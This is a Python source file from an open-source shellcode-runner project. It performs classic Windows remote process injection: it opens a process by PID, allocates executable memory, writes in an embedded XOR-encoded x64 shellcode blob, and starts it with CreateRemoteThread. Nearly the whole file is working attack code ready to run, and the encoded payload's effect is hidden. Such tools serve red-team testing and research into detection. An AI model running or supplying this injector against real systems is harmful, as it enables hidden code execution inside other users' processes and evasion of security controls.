#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This repository implements multiples way to execute
#    shellcode with different platforms, systems and languages.
#    Copyright (C) 2023  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This repository implements multiples way to execute
shellcode with different platforms, systems and languages.
"""

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This repository implements multiples way to execute
shellcode with different platforms, systems and languages.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/ShellcodeRunners"

copyright = """
ShellcodeRunners  Copyright (C) 2023  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = []

print(copyright)

from ctypes import windll, c_void_p, c_ulonglong, c_char_p, byref, c_ulong
from sys import argv, exit, stderr

if len(argv) != 2:
    print('USAGES:', argv[0], '<pid>', file=stderr)
    exit(1)

if not argv[1].isdigit():
    print('USAGES:', argv[0], '<pid>', file=stderr)
    exit(1)

kernel32 = windll.kernel32

shellcode = bytes(
    b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d"
    b"\x05\xef\xff\xff\xff\x48\xbb\xd3\x19\x5b\x4e\x88"
    b"\x70\xc3\x9d\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
    b"\xff\xe2\xf4\x2f\x51\xd8\xaa\x78\x98\x03\x9d\xd3"
    b"\x19\x1a\x1f\xc9\x20\x91\xcc\x85\x51\x6a\x9c\xed"
    b"\x38\x48\xcf\xb3\x51\xd0\x1c\x90\x38\x48\xcf\xf3"
    b"\x51\xd0\x3c\xd8\x38\xcc\x2a\x99\x53\x16\x7f\x41"
    b"\x38\xf2\x5d\x7f\x25\x3a\x32\x8a\x5c\xe3\xdc\x12"
    b"\xd0\x56\x0f\x89\xb1\x21\x70\x81\x58\x0a\x06\x03"
    b"\x22\xe3\x16\x91\x25\x13\x4f\x58\xfb\x43\x15\xd3"
    b"\x19\x5b\x06\x0d\xb0\xb7\xfa\x9b\x18\x8b\x1e\x03"
    b"\x38\xdb\xd9\x58\x59\x7b\x07\x89\xa0\x20\xcb\x9b"
    b"\xe6\x92\x0f\x03\x44\x4b\xd5\xd2\xcf\x16\x7f\x41"
    b"\x38\xf2\x5d\x7f\x58\x9a\x87\x85\x31\xc2\x5c\xeb"
    b"\xf9\x2e\xbf\xc4\x73\x8f\xb9\xdb\x5c\x62\x9f\xfd"
    b"\xa8\x9b\xd9\x58\x59\x7f\x07\x89\xa0\xa5\xdc\x58"
    b"\x15\x13\x0a\x03\x30\xdf\xd4\xd2\xc9\x1a\xc5\x8c"
    b"\xf8\x8b\x9c\x03\x58\x03\x0f\xd0\x2e\x9a\xc7\x92"
    b"\x41\x1a\x17\xc9\x2a\x8b\x1e\x3f\x39\x1a\x1c\x77"
    b"\x90\x9b\xdc\x8a\x43\x13\xc5\x9a\x99\x94\x62\x2c"
    b"\xe6\x06\x06\x32\x71\xc3\x9d\xd3\x19\x5b\x4e\x88"
    b"\x38\x4e\x10\xd2\x18\x5b\x4e\xc9\xca\xf2\x16\xbc"
    b"\x9e\xa4\x9b\x33\x90\xde\xb7\xd9\x58\xe1\xe8\x1d"
    b"\xcd\x5e\x62\x06\x51\xd8\x8a\xa0\x4c\xc5\xe1\xd9"
    b"\x99\xa0\xae\xfd\x75\x78\xda\xc0\x6b\x34\x24\x88"
    b"\x29\x82\x14\x09\xe6\x8e\x2d\xe9\x1c\xa0\xb3\xb6"
    b"\x61\x3e\x4e\x88\x70\xc3\x9d"
)

pid = int(argv[1])

handle_process = kernel32.OpenProcess(0x1f0fff, False, pid)
kernel32.VirtualAllocEx.restype = c_void_p
shellcode_address = kernel32.VirtualAllocEx(handle_process, 0, len(shellcode), 0x3000, 0x00000040)
kernel32.WriteProcessMemory.argtypes = (c_void_p, c_void_p, c_char_p, c_ulonglong, c_ulonglong)
kernel32.CreateRemoteThread.argtypes = (c_void_p, c_void_p, c_ulonglong, c_void_p, c_void_p, c_ulonglong, c_void_p)
kernel32.WriteProcessMemory(handle_process, shellcode_address, c_char_p(shellcode), len(shellcode), c_ulonglong(0))
kernel32.CreateRemoteThread(handle_process, None, 0, shellcode_address, None, 0, byref(c_ulong(0)))
